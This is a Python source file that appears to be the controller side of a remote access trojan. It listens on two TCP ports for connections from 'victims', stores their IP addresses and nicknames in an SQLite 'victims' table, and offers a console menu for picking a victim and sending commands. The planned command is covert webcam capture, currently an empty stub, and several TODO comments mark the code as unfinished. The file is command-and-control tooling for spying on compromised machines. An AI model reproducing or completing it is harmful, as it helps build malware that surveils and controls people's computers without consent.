
import socket
import threading
import sqlite3
import pickle
import time

# Local imports
from other_func import *

HOST = ''
CMD_PORT = 55555
DATA_PORT = 44444

# Todo: Change variable names to more relevant names
# Todo: Properly comment code

# Todo: Add webcam snap
# Todo: Fix user selection
# Todo: CLEAN CODE


class ChooseToAttack(object):
    # selected_user, users_online[x] => [IP, PORT, CMD_CONN, DATA_CONN] * reference

    def __init__(self):
        self.selected_user = {}  # Dict with data of selected victim.
        self.users_online = {}  # A dict containing lists, each list contain user specific data.
        self.online_size = len(self.users_online.keys())
        # We use this to check if the length of users_online has changed when the script is running.
        # With online_size being the old/current size and comparing it with len(users_online) we see
        # if any new connections have been made.

        self.buffer = 1024
        # The max size of each TCP packet we are sending, this value is the same on the client script.

        self.switch = True
        # We use this as a switch to shut down parts of the script so we can forwards and backwards.
        self.refresh_sc = True
        # If new data/errors come to us we refresh our screen and reprint our updated data structures.
        self.printing_done = bool
        self.printing_anim = True
        # Boolean variables related to our console screen printing.
        self.input_thread = True
        # TO ADD FOR INPUT THREAD
        self.database = ManageDB()
        # class object that we use to manage our database.

    def get_connections(self):
        # Thread running here forever.
        while True:
            cmd_conn, addr = cmd_sock.accept()
            data_conn, _ = data_sock.accept()
            IP, PORT = addr[0], addr[1]

            db_output = self.database.find(IP)
            name = db_output[0] if db_output else random_name()

            if not db_output:
                self.database.insert(name, IP)

            elif name in self.users_online:
                # Prevents 2 connections from the same PC
                cmd_conn.close()
                data_conn.close()
                continue

            self.users_online[name] = [IP, PORT, cmd_conn, data_conn]
            thread = threading.Thread(target=self.check_connection, args=(name, self.users_online[name]))
            thread.start()

    def check_connection(self, name, user_data):
        # user_data => [IP, PORT, CMD_CONN, DATA_CONN]
        while True:
            try:
                if name not in self.selected_user:
                    online = user_data[2].recv(self.buffer)

                    if online:
                        pass
                    else:
                        raise ConnectionResetError
                pass

            except (ConnectionResetError, ConnectionAbortedError):
                if name in self.selected_user:
                    del self.selected_user[name]

                del self.users_online[name]
                self.refresh_sc = True
                break

    def pick_victim(self):
        while self.switch:
            if len(self.users_online.keys()) > self.online_size or self.refresh_sc:
                self.refresh_sc = False
                self.online_size = len(self.users_online.keys())
                clear_screen()

                if self.printing_anim:

                    for line in ascii_logo:
                        if '\n' in line:
                            time.sleep(0.1)
                            print(line, end='')
                        else:
                            print(line, end='')

                    self.printing_anim = False
                else:
                    print(ascii_logo, end='')

                rename_desc = " - Type 'rename' to rename a victim!"
                select_desc = " - Type the name of the victim you want to select!"

                print(beautify(rename_desc, '=', 'top', len(select_desc)))
                print(beautify(select_desc, '=', 'bottom'), end='\n\n')

                for victim in self.users_online:
                    print(f" [+] {victim} [+] connected on \"{self.users_online[victim][0]}\"")

                self.printing_done = True

            elif self.input_thread:
                self.input_thread = False
                inp_thread = threading.Thread(target=self.get_input)
                inp_thread.start()
            else:
                continue

    def get_input(self):
        while self.switch:

            if self.printing_done:
                user_input = input('\n >>> ')
                self.printing_done = False

                if user_input in self.users_online.keys():
                    self.selected_user[user_input] = self.users_online[user_input]
                    self.switch = False

                elif user_input.lower() == 'rename':
                    name = input("\n Type the name of the victim you wish to rename > ")

                    if name in self.users_online.keys():
                        new_name = input(f"\n Type a new name for {name} > ")

                        if new_name and new_name != name:
                            self.database.update(new_name, name)
                            self.users_online[new_name] = self.users_online[name]
                            del self.users_online[name]
                        else:
                            print(f'\n ERROR: username [{name}] already exists!')
                            input(' Press ENTER to continue > ')

                        self.refresh_sc = True
                    else:
                        print(f'\n ERROR: user [{name}] does not exist!')
                        input(' Press ENTER to continue > ')  # MAKE IT A FUNC --> pressEnter()
                        self.refresh_sc = True
                else:
                    if user_input != '':
                        print(f"\n Error: No user found named [{user_input}]")
                        input(' Press ENTER to continue > ')

                    self.refresh_sc = True


class ExecuteCMD(object):

    def __init__(self, victim_data):
        self.victim_data = victim_data
        self.switch = True
        self.input_thread = True
        self.refresh_sc = True
        self.printing_done = False
        self.offline = False
        self.real_name = list(self.victim_data.keys())[0]

        self.run_cmd = {
            'take picture': ['Take (x) pictures every (y) seconds', self.take_pictures],
            'back': ['Go back to victim selection', self.back]}

    def pick_command(self):
        while self.switch:

            if self.refresh_sc:
                self.refresh_sc = False
                clear_screen()

                print(ascii_cmd)
                print(f' Type the name of the command you want to use on [{self.real_name}]\n')
                print(beautify(" command/description", '~'))
                print('\n', end='')

                for cmd in self.run_cmd:
                    print(f" {cmd} <cmd--desc> {self.run_cmd[cmd][0]}")

                self.printing_done = True

                if self.input_thread:
                    self.input_thread = False
                    inp_thread = threading.Thread(target=self.get_input)
                    inp_thread.start()

    def get_input(self):  # buggy
        while self.switch:
            if self.printing_done:
                command = input("\n CMD: ")
                self.printing_done = False

                if self.offline:
                    print(f" [{self.real_name}] is offline!")
                    input(' Press ENTER to go back to victim selection! > ')
                    self.switch = False
                    self.refresh_sc = True
                    break

                if command in self.run_cmd:
                    output = self.run_cmd[command][1]()

                    if output == 'back':
                        self.switch = False
                        break

                self.refresh_sc = True

    def take_pictures(self):
        pass

    def back(self):
        self.switch = False

    def user_online(self):
        # Thread checking selected_user dict from to_attack object
        # to see if the user disconnected
        while True:
            if not to_attack.selected_user:
                self.offline = True
                break


class ManageDB(object):

    def __init__(self):
        self.conn = sqlite3.connect("database.db", check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_table()

    def find(self, ip):
        self.cursor.execute("SELECT nickname FROM victims WHERE ip=?", (ip,))
        return self.cursor.fetchone()

    def insert(self, nick, ip):
        self.cursor.execute("INSERT INTO victims VALUES (?, ?)", (nick, ip))
        self.conn.commit()

    def update(self, new, old):
        self.cursor.execute("UPDATE victims SET nickname=? WHERE nickname=?", (new, old))
        self.conn.commit()

    def create_table(self):
        try:
            self.cursor.execute("""CREATE TABLE victims (nickname TEXT UNIQUE, ip TEXT UNIQUE)""")
            self.conn.commit()

        except sqlite3.OperationalError:
            # Table is already created!
            pass


if __name__ == '__main__':

    cmd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cmd_sock.bind((HOST, CMD_PORT))
    data_sock.bind((HOST, DATA_PORT))

    cmd_sock.listen(5)
    data_sock.listen(5)

    to_attack = ChooseToAttack()
    listener = threading.Thread(target=to_attack.get_connections)
    listener.start()

    while True:
        to_attack.switch = True
        to_attack.input_thread = True
        to_attack.refresh_sc = True
        to_attack.pick_victim()

        execute = ExecuteCMD(to_attack.selected_user)
        online_thread = threading.Thread(target=execute.user_online)
        online_thread.start()
        execute.pick_command()